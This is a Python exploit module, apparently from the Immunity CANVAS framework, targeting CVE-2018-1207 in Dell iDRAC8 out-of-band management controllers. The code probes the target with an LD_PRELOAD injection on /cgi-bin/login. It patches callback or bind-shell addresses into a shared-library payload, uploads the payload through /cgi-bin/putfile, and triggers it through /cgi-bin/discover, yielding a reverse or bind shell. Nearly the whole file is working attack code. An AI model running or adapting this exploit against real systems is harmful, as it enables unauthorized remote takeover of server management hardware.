#! /usr/bin/env python

#
# CANVAS Exploit
#

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2006
# http://www.immunityinc.com/CANVAS/ for more information


import urllib2
import sys
import ssl
import re
import struct


# covers both angles
if "." not in sys.path: sys.path.append(".")

from exploitutils import *

import libs.spkproxy as spkproxy
from tcpexploit import *
from ExploitTypes.CommandLineExecuter import CommandExploit
from canvasexploit import *
from canvasengine import UNIVERSAL_MOSDEF

from tcpexploit import *
from ExploitTypes.CommandLineExecuter import CommandExploit
from canvasexploit import *
import unixShellNode

import socket
import timeoutsocket
from contextlib import contextmanager


NAME                        = "iDrac8 WebApp RCE"
DESCRIPTION                 = "Loads an arbitrary shared library in order to achieve RCE"

DOCUMENTATION               = {}
DOCUMENTATION["CVE Name"]   = "CVE-2018-1207"
DOCUMENTATION["CVE URL"]    = "https://nvd.nist.gov/vuln/detail/CVE-2018-1207"
DOCUMENTATION["NOTES"]      = """

This module exploits a CGI Injection vulnerability in iDRAC8 in order to achieve
Remote Code Execution. We upload a shared library that we can then invoke
with the CGI injection vulnerability.

Type of payloads currently supported by this module:
- BINDSHELL
- CALLBACK (MOSDEF)
"""

VERSION                     = "1.1"

PROPERTY                    = {}
PROPERTY["TYPE"]            = "Web Exploits"
PROPERTY["SITE"]            = "Remote"
PROPERTY["ARCH"]            = [["Dell iDRAC8 PowerEdge R730 - Out of Band Management Embedded System"]]
PROPERTY["VERSION"]         = ["2.43.100.43", "2.50.50.50 (Build 33)", "2.30.30.30 (Build 50)"]

NOTES = """
"""

CHANGELOG = """
    1.0: JANUARY 29  2018
    1.1: NOVEMBER 28 2019
"""

TIMEOUTSOCKET_REF = timeoutsocket.timeoutsocket
NO_TIMEOUTSOCKET  = socket._no_timeoutsocket
REAL_SOCKET       = socket._realsocket

# Default timeout in seconds for socket connections
TIMEOUT = 10

@contextmanager
def socket_timeout(timeout):
    """
    Wrap python's 2.3+ default socket timeout mechanism
    in a with statement while ensuring this all works
    fine with timeoutsocket.

    We have to do this here because timeoutsocket timeouts
    do not work with urllib2.
    """
    socket.socket = NO_TIMEOUTSOCKET
    socket.setdefaulttimeout(timeout)
    try:
        yield
    finally:
        socket.setdefaulttimeout(None)
        socket.socket = TIMEOUTSOCKET_REF


class theexploit(tcpexploit, CommandExploit):
    def __init__(self):
        tcpexploit.__init__(self)
        CommandExploit.__init__(self)
        self.name = NAME
        self.host = "127.0.0.1"
        self.port = 443
        self.pre_check = True
        self.hostname = None
        self.respath = os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/"))
        self.http_ssl = True
        self.base_url = ""

        self.type = "BACK"
        self.use_bindshell = False
        self.bindshell_port = 5555

        self.ua = None

        return

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def getargs(self):
        """
        Get arguments for attack
        """
        self.host = self.target.interface
        self.hostname = self.argsDict.get("hostname", self.hostname)
        if not self.hostname:
            self.hostname = self.host
        self.port = int(self.argsDict.get("port", self.port))

        self.http_ssl = self.argsDict.get("http_ssl", self.ssl)
        if self.http_ssl:
            protocol = "https"
        else:
            protocol = "http"
        self.base_url = protocol + "://" + self.hostname + ':' + str(self.port)

        self.pre_check = self.argsDict.get("pre_check", self.pre_check)

        self.use_bindshell  = self.argsDict.get("use_bindshell", self.use_bindshell)
        self.bindshell_port = int(self.argsDict.get("bindshell_port", self.bindshell_port))

        if self.use_bindshell:
            self.type = "BIND"
        else:
            self.type = "BACK"


    def test_vulnerability(self):
        """
        Invokes a Login module into the WebApp to validate whether the
        server will be vulnerable to the attack or not.
        """
        logging.info("Validating if the server is vulnerable (by using LD_PRELOAD)")

        with socket_timeout(30):
            try:
                request = urllib2.Request(self.base_url + '/cgi-bin/login?LD_PRELOAD=/tmp/foo.so')
                response = urllib2.urlopen(request, context=ssl._create_unverified_context())
                response_code = response.code
            except urllib2.HTTPError as e:
                response = e.read()
                response_code = e.getcode()
            except urllib2.URLError as e:
                logging.critical("It was not possible to connect to {}:{}".format(self.hostname, self.port))
                self.setProgress(-1)
                return False
            except Exception:
                logging.critical("An unexpected error has occurred, please try again")
                self.setProgress(-1)
                return False

            # self.log("response[{}]: {}".format(response_code, response))

        if response_code in [200, 503]:
            c = re.compile(".*'/tmp/foo.so'.*cannot be preloaded.*", re.MULTILINE|re.DOTALL)
        else:
            logging.critical("Error requesting url {} [{}]".format(self.base_url + '/cgi-bin/login?LD_PRELOAD=/tmp/foo.so', response_code))
            self.setProgress(-1)
            return False

        if c.match(response) is not None:
            logging.info("Server {} seems to be vulnerable".format(self.hostname))
            return True
        else:
            logging.critical("It was not possible to utilize the LD_PRELOAD variable in the server {}".format(self.host))
            self.setProgress(-1)
            return False

    def generate_payload(self):
        binary_payload_path = "{}/payload.so".format(self.respath)
        payload_dropper = ''
        with open(binary_payload_path, "rb") as file_in:
            payload_dropper = file_in.read()

        if self.type == 'BACK':
            payload_dropper = payload_dropper.replace('\xDE\xAD\xBE\xEF', socket.inet_aton(self.callback.ip))
            payload_dropper = payload_dropper.replace('\xCA\xFE', struct.pack('>H', self.callback.port))
        else:
            payload_dropper = payload_dropper.replace('\xDE\xAD\xBE\xEF', socket.inet_aton(self.target.interface))
            payload_dropper = payload_dropper.replace('\xCA\xFE', struct.pack('>H', self.bindshell_port))

        payload_dropper = payload_dropper.replace('\x1B\xAD\x1D\xEA', struct.pack('>I', self.id))  # replace the mosdef ID
        payload_dropper = payload_dropper.replace('Immunity', randomstring(8))  # replace lock filename to avoid multiples shell
        payload_dropper = payload_dropper.replace('FILENAME', randomstring(8))  # replace drop filename
        payload_dropper = payload_dropper.replace('TYPE', self.type)            # set type of payload (BIND/BACK)


        res  = "RACPKSSHAUTHKEY1".ljust(32, '\x00')
        res += struct.pack('<L', len(payload_dropper))
        res += struct.pack('<L', 1)
        res += payload_dropper

        logging.info("Payload generated successfully")
        return res

    def upload_payload(self, payload):
        logging.info("Uploading payload to WebApp - {}".format(self.base_url + "/cgi-bin/putfile"))

        with socket_timeout(30):
            try:
                request = urllib2.Request(self.base_url + '/cgi-bin/putfile', payload)
                request.add_header('Content-Lenght', '%d' % len(payload))
                request.add_header('Content-Type', 'application/octet-stream')
                response = urllib2.urlopen(request, context=ssl._create_unverified_context())
                response_code = response.code
                response = response.read()
            except urllib2.HTTPError as e:
                response = e.read()
                response_code = e.getcode()
            except Exception:
                logging.error("Error requesting url {}. [{} - {}]".format(self.url, str(response_code), str(response)))
                self.setProgress(-1)
                return False

        logging.debug("response[{}]: {}".format(response_code, response))

        if response_code not in [200, 503]:
            logging.error("Error requesting url {}. [{} - {}]".format(self.url, str(response_code), str(response)))
            self.setProgress(-1)
            return False

        logging.info("Payload uploaded successfully to /tmp/sshpkauthupload.tmp [Status code: {}]".format(response_code))
        return True

    def trigger_payload(self, payload):
        logging.info("Triggering the payload uploaded to {}:{}".format(self.host, self.port))

        with socket_timeout(30):
            try:
                request = urllib2.Request(self.base_url + '/cgi-bin/discover?LD_PRELOAD=/tmp/sshpkauthupload.tmp', payload)
                request.add_header('Content-Lenght', '%d' % len(payload))
                request.add_header('Content-Type', 'application/octet-stream')
                response = urllib2.urlopen(request, context=ssl._create_unverified_context())
                response_code = response.code
                response = response.read()
            except urllib2.HTTPError as e:
                response = e.read()
                response_code = e.getcode()

        logging.debug("response[{}]: {}".format(response_code, response))

        if response_code not in [200]:
            logging.info("Error requesting url {}. Status code: {}".format(self.url, response_code))
            self.setProgress(-1)
            return False

        if self.type == "BACK":
            logging.info("Payload triggered successfully, you should have received a connection back to {}:{}".
                 format(self.callback.ip, self.callback.port))
        else:
            logging.info("Now you can connect to {}:{} for get a shell".format(self.target.interface, self.bindshell_port))

        return True

    def run(self):
        self.getargs()

        if self.pre_check:
            if not self.test_vulnerability():
                self.setInfo("{} in {}:{} done (not vulnerable)".format(self.name, self.hostname, self.port))
                self.setProgress(-1)
                return 0
        else:
            logging.info("Launching the attack without prior known whether server is vulnerable or not")

        self.setProgress(25)

        payload = self.generate_payload()

        if payload == "":
            self.setInfo("{} in {}:{} done (failed generate payload)".format(self.name, self.hostname, self.port))
            self.setProgress(-1)
            return 0

        self.setProgress(45)

        if self.upload_payload(payload) == 0:
            self.setInfo("{} in {}:{} done (failed upload)".format(self.name, self.hostname, self.port))
            self.setProgress(-1)
            return 0

        self.setProgress(70)

        if self.trigger_payload(payload) == 0:
            self.setInfo("{} in {}:{} done (failed trigger)".format(self.name, self.hostname, self.port))
            self.setProgress(-1)
            return 0

        self.setInfo("{} in {}:{} done (success)".format(self.name, self.hostname, self.port))
        self.setProgress(100)
        return 1


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
    if ret not in [0, 1, None]:
        ret.interact()

